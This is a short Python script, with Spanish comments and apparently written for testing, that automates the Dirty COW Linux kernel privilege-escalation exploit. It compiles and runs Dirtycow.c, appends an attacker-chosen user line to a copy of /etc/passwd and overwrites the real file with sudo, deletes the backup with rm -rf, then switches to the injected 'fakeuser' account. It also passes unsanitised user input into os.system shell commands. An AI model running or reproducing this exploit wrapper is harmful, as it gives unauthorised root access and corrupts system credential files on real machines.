def PruebaDirtyCow():
  import os
  DirtycowPath='/home/user1files3/Dirtycow.c'
  #Compilar el DirtyCow.c
  Compilar = 'gcc -pthread ' + DirtycowPath + ' -o /home/user1files3/dirtyCow -lcrypt'
  os.system(Compilar)
  #Ejecutar el DirtyCow.c
  print('Compilando y ejecutando DirtyCow.c ...')
  os.system('ls -l')
  os.system('./dirtyCow password')
  print('El archivo passwd.bak se ha copiado a /tmp/passwd.bak')
  linea_generada = raw_input('Ingrese la linea de usuario generada por el Dirty Cow: ')
  linea = '"' + linea_generada + '"'
  os.system('cp /tmp/passwd.bak /tmp/passwd.txt')
  os.system('echo ' + linea + ' >> /tmp/passwd.txt')
  os.system('sudo mv /tmp/passwd.txt /etc/passwd')
  os.system('rm -rf /tmp/passwd.bak')
  os.system('su fakeuser')
PruebaDirtyCow()


